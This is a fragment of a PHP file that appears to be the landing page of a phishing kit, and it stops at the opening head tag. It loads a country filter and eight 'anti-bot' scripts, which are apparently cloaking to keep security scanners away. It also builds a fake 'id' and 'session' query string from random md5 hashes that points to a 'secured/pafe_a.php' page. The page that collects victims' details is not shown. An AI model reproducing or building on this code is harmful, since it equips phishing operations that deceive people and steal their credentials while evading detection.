<?php

include_once('secured/country_permit.php');
include_once('bots/anti1.php');
include_once('bots/anti2.php');
include_once('bots/anti3.php');
include_once('bots/anti4.php');
include_once('bots/anti5.php');
include_once('bots/anti6.php');
include_once('bots/anti7.php');
include_once('bots/anti8.php');

?>

<?php require_once 'date_config.php'; ?>

<?php

$praga=rand();
$praga=md5($praga);

$url= "secured\pafe_a.php?id=".$praga.$praga."&session=".$praga.$praga;
?>

<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en">
<head>
 